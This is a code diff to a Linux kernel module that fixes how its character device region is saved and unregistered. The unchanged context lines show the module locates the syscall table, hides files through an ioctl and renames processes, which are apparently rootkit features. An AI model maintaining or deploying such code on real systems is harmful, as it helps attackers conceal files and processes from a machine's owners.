@@ -86,6 +86,10 @@ int change_process_name(const char *orig_name, const char *new_name) {
 }
 
 static int major;
+// Holds the full major/minor-encoded dev_t returned by alloc_chrdev_region,
+// so lkm_exit can unregister the exact same region (unregister_chrdev_region
+// takes a dev_t, not a bare major number).
+static dev_t lkm_dev_no;
 struct cdev *kernel_cdev;
 // Points to a static empty string initially; replaced by a kmalloc'd buffer in IOCTL_FILE_HIDE.
 // The empty-string sentinel is checked via *HIDDEN_FILE != '\0' before kfree — do not set to NULL.
@@ -373,7 +377,7 @@ struct file_operations fops = {
 static int __init lkm_init(void)
 {
 	int ret;
-	dev_t dev_no, dev;
+	dev_t dev;
 
 	/* Allocate a character device structure */
 	kernel_cdev = cdev_alloc();
@@ -383,14 +387,14 @@ static int __init lkm_init(void)
 	kernel_cdev->owner = THIS_MODULE;
 
 	/* Dynamically allocate a character device region */
-	ret = alloc_chrdev_region(&dev_no, 0, 1, "loadable_kernel_module");
+	ret = alloc_chrdev_region(&lkm_dev_no, 0, 1, "loadable_kernel_module");
 	if (ret < 0) {
 		pr_info("major number allocation failed\n");
 		cdev_del(kernel_cdev);
 		return ret;
 	}
 
-	major = MAJOR(dev_no);
+	major = MAJOR(lkm_dev_no);
 	dev = MKDEV(major, 0);
 	printk("The major number for your device is %d\n", major);
 
@@ -399,7 +403,7 @@ static int __init lkm_init(void)
 	if (ret < 0) {
 		pr_info(KERN_INFO "unable to allocate cdev");
 		cdev_del(kernel_cdev);
-		unregister_chrdev_region(dev_no, 1);
+		unregister_chrdev_region(lkm_dev_no, 1);
 		return ret;
 	}
 
@@ -408,7 +412,7 @@ static int __init lkm_init(void)
 	if (!__sys_call_table) {
 		printk(KERN_INFO "Failed to find sys_call_table\n");
 		cdev_del(kernel_cdev);
-		unregister_chrdev_region(dev_no, 1);
+		unregister_chrdev_region(lkm_dev_no, 1);
 		return -ENOENT;
 	}
 
@@ -443,7 +447,10 @@ static void __exit lkm_exit(void)
 
 	pr_info("%s: removed\n", OURMODNAME);
 	cdev_del(kernel_cdev);
-	unregister_chrdev_region(major, 1);
+	// Must pass the dev_t saved from alloc_chrdev_region, not the bare major
+	// number — unregister_chrdev_region(major, 1) silently unregisters the
+	// wrong (major=0) region and leaks the real one across insmod/rmmod cycles.
+	unregister_chrdev_region(lkm_dev_no, 1);
 }
 
 module_init(lkm_init);
